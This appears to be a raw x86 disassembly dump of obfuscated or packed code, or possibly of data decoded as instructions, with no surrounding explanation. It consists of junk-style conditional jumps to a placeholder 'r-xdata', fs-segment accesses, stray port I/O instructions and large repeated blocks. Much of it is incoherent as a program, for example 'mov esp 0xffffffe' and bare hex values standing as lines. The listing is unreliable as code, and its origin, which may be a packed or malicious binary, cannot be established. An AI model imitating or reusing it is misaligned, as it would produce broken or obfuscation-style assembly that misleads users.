add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac128bf
sub_401faf
pop eax
pop edx
pop eax
jae r-xdata
pop edx
pop eax
jae r-xdata
or eax 0xff6d830f
pop eax
pop ecx
jge r-xdata
jne 0xf44e3c6
pop ecx
or eax 0xf04c483
mov ebp ebp
add [ eax + eax - 0x7af10000 ] 0xea810971
jg r-xdata
jne 0x24c12fef
jno r-xdata
push ebp
call sub_401f24
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jne r-xdata
and eax 0x8b0f327f
jae r-xdata
sub ecx 0xe1813e75
pushfd
call sub_401f0f
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_401faf
ja 0x504a3b6
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jns r-xdata
jge 0xffffffffb8af9f26
jae r-xdata
pop ecx
jno r-xdata
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
ja r-xdata
and ecx 0xf681ad79
jns r-xdata
jmp 0xcaa8cf
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
jno 0x16400d69
pop edx
jg r-xdata
jpo 0xf70988c
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jns r-xdata
xor edx 0x81257159
r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
jae r-xdata
je 0xffffffff814fc165
jne r-xdata
jno 0xffffffff834f7793
jg r-xdata
jg 0xffffffff9c94739a
ja r-xdata
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac128bf
push esi
push esi
call sub_40209a
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd7991
push edx
call sub_401fd0
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jns r-xdata
jae r-xdata
je 0xffffffffa3a4c565
call sub_40204f
xor edi 0x517f5859
jno 0xfffffffff2c17b0c
push ecx
push ebx
call sub_401f9f
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
sub_401fd0
jg r-xdata
pop eax
add esp 0x4
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
pop ecx
jno r-xdata
jno 0x16400d69
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcaa8cf
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jns r-xdata
xor edx 0x81257159
r-xdata
pop edx
jg r-xdata
jpo 0xf70988c
jae r-xdata
sub eax 0x4d795a58
jae r-xdata
je 0xffffffff814fc165
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44e3c6
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
jg 0xffffffff9c94739a
ja r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
push esi
push esi
call sub_40209a
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd7991
push edx
call sub_401fd0
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jne r-xdata
jno 0xffffffff834f7793
push ebp
call sub_401f24
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4c565
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac128bf
jg r-xdata
jne 0x24c12fef
jae r-xdata
sub ecx 0xe1813e75
call sub_40204f
xor edi 0x517f5859
jno 0xfffffffff2c17b0c
push ecx
push ebx
call sub_401f9f
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8af9f26
pushfd
call sub_401f0f
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_401faf
ja 0x504a3b6
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jno r-xdata
pop ecx
jae r-xdata
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub_40201b
pop eax
pop ecx
pop ecx
jae r-xdata
pop eax
pop eax
jae r-xdata
or edx 0xff50830f
pop ecx
pop eax
jg r-xdata
mov ebx 0x8f0f6975
pop edx
jne r-xdata
jno 0xfffffffff2c17b0c
push ecx
push ebx
call sub_401f9f
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
pushfd
push ebx
push esp
pushfd
add esi 0xf337d58
test [ edi - 0x5b ] bh
pop ecx
jno r-xdata
jno 0x16400d69
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jns r-xdata
jmp 0xcaa8cf
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
pop edx
jg r-xdata
jpo 0xf70988c
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jae r-xdata
sub eax 0x4d795a58
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44e3c6
jns r-xdata
xor edx 0x81257159
r-xdata
call sub_40204f
xor edi 0x517f5859
push edi
push ebp
push ecx
and ecx 0xff378f0f
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
jae r-xdata
je 0xffffffff814fc165
jne r-xdata
jno 0xffffffff834f7793
push ebp
call sub_401f24
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jg r-xdata
jg 0xffffffff9c94739a
ja r-xdata
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac128bf
jg r-xdata
jne 0x24c12fef
jae r-xdata
sub ecx 0xe1813e75
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd7991
push edx
call sub_401fd0
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8af9f26
pushfd
call sub_401f0f
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_401faf
ja 0x504a3b6
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4c565
jno r-xdata
pop ecx
jae r-xdata
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
push esi
push esi
call sub_40209a
sub ebx 0xfeace855
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
sub_40204f
pushfd
jae r-xdata
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
pop ecx
jno r-xdata
jno 0x16400d69
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcaa8cf
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jns r-xdata
xor edx 0x81257159
r-xdata
pop edx
jg r-xdata
jpo 0xf70988c
jae r-xdata
sub eax 0x4d795a58
jae r-xdata
je 0xffffffff814fc165
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44e3c6
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
jg 0xffffffff9c94739a
ja r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
push esi
push esi
call sub_40209a
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd7991
push edx
call sub_401fd0
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jne r-xdata
jno 0xffffffff834f7793
push ebp
call sub_401f24
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4c565
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac128bf
jg r-xdata
jne 0x24c12fef
jae r-xdata
sub ecx 0xe1813e75
call sub_40204f
xor edi 0x517f5859
jno 0xfffffffff2c17b0c
push ecx
push ebx
call sub_401f9f
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8af9f26
push edi
push eax
push edx
call sub_401faf
ja 0x504a3b6
pushfd
call sub_401f0f
mov eax [ fs : 0xffffffff9ce8c173 ]
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jno r-xdata
pop ecx
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
sub_40209a
sub [ esp + 0x40 ] r-xdata
sub esp 0x10
pop edx
ja r-xdata
jg r-xdata
jmp [ 0xce8d0f ]
jge r-xdata
jmp 0xffffffff844f5250
jno r-xdata
sub esi 0x73bd047f
push ebp
ja r-xdata
jmp [ 0xfffffffff381df77 ]
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1df7f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
ja r-xdata
call 0xffc9a8e
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1a0b9
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a45e55
jge r-xdata
call [ 0xffffffffca81677d ]
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
pop edx
pop edx
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3a8f0
ja r-xdata
jge 0x71fc60f7
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
push ebp
pushfd
call sub_4021f8
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jno r-xdata
mov ebx 0xf04c483
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jne r-xdata
or edx 0xf3812e79
pushfd
push esi
call sub_4021ef
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_402309
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
pop eax
jge r-xdata
jge 0xffffffffffa2a4a4
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jno r-xdata
sub esi 0x89641f79
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc15fde
jae r-xdata
add edx 0xff108f0f
pop ecx
jns r-xdata
jno 0xffffffff874f5757
jne r-xdata
sub edi 0x64244481
xchg ebp eax
sub [ eax ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacb21c
jae r-xdata
ja 0xffffffffa3c331b4
push ecx
push edx
push ebp
sub esp 0x4
call sub_4021bb
xor ebx 0x15ff4e7f
mov edx 0xff47830f
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
ja r-xdata
pop edx
mov eax 0xff55870f
jg r-xdata
jpo 0xdea79a
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
ja r-xdata
xor ebx 0xff3d870f
call sub_40216b
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402589
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
jmp 0xffffffffff79a2b2
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92c12
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_40221b
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jg r-xdata
add eax 0x5abb2979
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e7ce
jg r-xdata
ja 0xcaa5ca
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44e9fd
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e6d4
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9ba471
pop edx
jge r-xdata
jo 0xffffffff854f7cc3
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e789
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcf4c8
jae r-xdata
call sub_402380
jb 0xffffffff81b2a036
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f97e4
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0a807
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd340b
add esp 0x4
jae r-xdata
jl 0xf3a54c
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402226
jae 0xffffffffff43aa4b
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f7c45
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe89176e2
push 0x81ffffff
out 0x77 al
jne r-xdata
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jns 0x158a7a6
push edi
call sub_402478
jg 0xfffffffff0b37e9f
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133b322
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199b
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e75
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff84289cc1
jae r-xdata
call 0xffffffff854f7eaf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c150
jo 0xffffffffa2c13363
push ecx
push edx
call sub_402448
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c157a5
push edx
call sub_4023e4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40245f
jo 0xff99a4c
jo 0xffffffff894f7e89
jae r-xdata
je 0xffffffffff6da893
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402422
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4024c8
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a9d3
push esp
pushfd
push ecx
sub esp 0xc
call sub_402445
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_40216b
pop ecx
pop edx
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jae r-xdata
add edx 0xff108f0f
pop edx
mov eax 0xff55870f
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1df7f
ja r-xdata
call 0xffc9a8e
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a45e55
jg r-xdata
and ebx 0xff5a870f
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop edx
pop edx
jae r-xdata
jne r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
ja r-xdata
jg r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
jae r-xdata
ja r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
pushfd
push esi
call sub_4021ef
sub ebx 0xa48f0f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
ja r-xdata
jge 0x71fc60f7
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1a0b9
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3a8f0
add [ eax ] al
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jno r-xdata
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_402309
add esi 0xa6830f
add [ eax ] al
mov ebx 0xf04c483
jae r-xdata
ja 0xffffffffa3c331b4
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
pop eax
ja r-xdata
xor edx 0x880f5e7f
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
push ecx
push edx
push ebp
sub esp 0x4
call sub_4021bb
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jne r-xdata
sub edi 0x64244481
xchg ebp eax
sub [ eax ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacb21c
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
push ebp
pushfd
call sub_4021f8
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jne r-xdata
or edx 0xf3812e79
jg r-xdata
jpo 0xdea79a
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
pop eax
jge r-xdata
jge 0xffffffffffa2a4a4
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc15fde
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402589
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jg r-xdata
ja 0xffffffffff9ba471
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e6d4
lea eax [ ecx + 0x1 ]
add [ eax ] al
pop ecx
jns r-xdata
jno 0xffffffff874f5757
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92c12
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_40221b
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jno r-xdata
and ebx 0x870f4975
jae r-xdata
call sub_402380
jb 0xffffffff81b2a036
or edx 0x54549c55
ja r-xdata
xor ebx 0xff3d870f
call sub_40216b
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e7ce
jg r-xdata
ja 0xcaa5ca
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44e9fd
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
jmp 0xffffffffff79a2b2
pop edx
jge r-xdata
jo 0xffffffff854f7cc3
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e789
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcf4c8
add esp 0x4
jae r-xdata
jl 0xf3a54c
jg r-xdata
add eax 0x5abb2979
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f97e4
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0a807
pop eax
jg r-xdata
jge 0xffffffff894f7c45
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd340b
ja r-xdata
jno 0xffffffffe89176e2
push 0x81ffffff
out 0x77 al
jne r-xdata
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402226
jae 0xffffffffff43aa4b
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jno r-xdata
jae 0xffffffff84289cc1
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jns 0x158a7a6
push edi
call sub_402478
jg 0xfffffffff0b37e9f
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133b322
